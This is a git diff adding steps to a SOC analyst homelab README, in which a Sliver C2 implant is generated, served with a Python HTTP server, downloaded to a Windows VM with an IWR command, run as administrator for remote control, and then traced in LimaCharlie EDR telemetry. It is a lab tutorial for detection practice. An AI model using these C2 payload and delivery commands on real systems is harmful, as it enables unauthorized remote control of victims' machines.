@@ -47,7 +47,7 @@ We will be using a Windows 11 VM with all the defenses turned off so that Micros
  
 **<h3>Step 2:  Setup Defense Systems for Logging and Collection</h3>**
 
-**<h5>2A. Installing Sysmon:</h5>**
+**<h4>2A. Installing Sysmon:</h4>**
 	System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time. Using the following set of commands, we can correctly install and then configure Sysmon on the Windows VM. 
 
 
@@ -69,7 +69,7 @@ Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
 ![PS C UsersUserDownloadsSysmon Get-Service sysmon64](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/e3ca8836-d3c7-4df0-879d-aa9f9294cea7)
 <img width="639" alt="Pasted Graphic 3" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/fc2ed2ed-5370-49fd-883d-14bdc84fd0e9">
 
-**<h3>2B. Creating a LimaCharlie sensor:</h3>**
+**<h4>2B. Creating a LimaCharlie sensor:</h4>**
 
 Limacharlie is an Endpoint Detection and Response (EDR) solution, offering continuous and unparalleled visibility into desktop, server, and cloud endpoints. It excels in monitoring both behavioral and technical aspects, with a telemetry retention period of 1 year. In this lab, we will use LimaCharlie as our primary source of collection for the Sysmon logs and analysis of said logs. 
 
@@ -85,7 +85,7 @@ This screen marks the successful installation of the sensor, which can then be v
 
 <img width="981" alt="Pasted Graphic 5" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/f763c27e-d646-4180-aaa6-2762494840dc">
 
-**<h3>2C. Setting up the Attack VM using Sliver:</h3>**
+**<h4>2C. Setting up the Attack VM using Sliver:</h4>**
 
 Sliver is a command and control (C2) framework designed to provide advanced capabilities for covertly managing and controlling remote systems. This tool can be used to set up a secure and reliable communication channel over Mutual TLS, HTTP(S), DNS, or Wireguard with target machines, enabling them to execute commands, gather information, and perform various post-exploitation activities.
 
@@ -102,7 +102,51 @@ mkdir -p /opt/sliver
 The commands written above can be executed in order to first install Mingw64 for dependencies, then we use wget to download and install the sliver-server binary, which allows us to run a server on this VM. Finally, we create a working local directory for the server. 
 
 
+**<h3>Step 3: Generating Attack Payload and Observing EDR Telemetry</h3>**
 
+**<h4>3A: Generating Payload:</h4>**
 
+Now, moving on to our local directory of /opt/sliver, we then proceed to launch an attack using the Sliver server we installed earlier. This server can be started by using the **sliver-server** command. We then generate a C2 attack payload using the command generate --http 192.168.78.128 --save /opt/sliver, which creates an executable file and stores it in the local directory. The generation can be checked by using the **implants** command.
+
+![image](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/eb104876-d0ae-40b3-bb8d-1a06effc2649)
+
+<img width="727" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/e21335c8-a581-4e4b-8266-df0d6bee6c36">
+
+However, the malicious executable has to be present on the Windows VM for the Sysmon sensor to pick up traffic. So we set up a temporary Python server using HTTP at port 80, then proceed to download the executable onto the Windows VM. This method is far easier and safe than utilizing the host client to transfer files between the VMs.
+
+```python3 -m http.server 80```
+```IWR -Uri http://192.168.78.128/SPANISH_EXHAUST.exe -Outfile C:\Users\User\Downloads\[payload_name].exe```
+
+After this, we need to execute the binary and see if it up and running smoothly. Firstly, we run the **http** command to set up a listener looking for any events from the Windows VM. We then execute the binary present on the VM with administrative privileges and check on the Ubuntu VM with the **sessions** command to show a list of the active binaries present in the payload. Using the session ID, we can log into the binary's command line interface, effectively allowing us to control the Windows VM from our attacker machine. 
+
+<img width="1180" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/7cc2bff0-8acd-480a-980d-abb9c02adefc">
+
+We then run a series of commands to check for identity, basic information and privileges of the machine the binary is present on.
+
+<img width="446" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/a72088dc-a13f-402d-98e4-e315a588f81e">
+
+<img width="755" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/751b0837-64b0-42b5-a20c-a64890d479a2">
+
+Since the binary is running with admin privileges, we have access to almost everything on the system, which qualifies as dangerous traffic. 
+
+**<h4>3B: Observing EDR Telemetry</h4>**
+
+We then proceed to observe the traffic between these two VMs using the LimaCharlie platform. This can be done by checking through 3 different ways of showing data:
+
+**<h5>Processes:</h5>** Processes are meticulously monitored through endpoint agents that collect comprehensive data on process creation, termination, and behavior, including process names, IDs, command lines, and execution paths, that can be analyzed for suspicious activity. Here, we can see that the SPANISH_EXHAUST.exe binary is executing with a PID of 556, and most importantly it is an unsigned action, which is possible proof of it being malicious.
+
+![image](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/2f8b77c0-ca69-4797-94f4-7271524ef7b8)
+
+**<h5>Network Connections:</h5>** 
+
+Opening the Network tab, we can see that the malicious binary is currently running on 192.168.78.129, which is the Windows VM's IP address on port 80 (HTTP), and that the 3-way handshake has been finished and the connection has been made, which is shown through the ESTABLISHED state.
+
+<img width="1190" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/9ebfe3a1-9fd3-4136-b4bb-14b6a87e2a91">
+
+**<h5>File System:</h5>** 
+
+LimaCharlie also offers a complete overview of the system the sensor is running on. We utilize this function to move to where our binary is located, and examine the file's hash using VirusTotal. This helps us identify that since VirusTotal has never seen the hash before, it logs it as an unknown file, which could be malicious in nature.
+
+<img width="889" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/24000473-4895-42c9-a557-e6c95f6c5ec9">
 
 
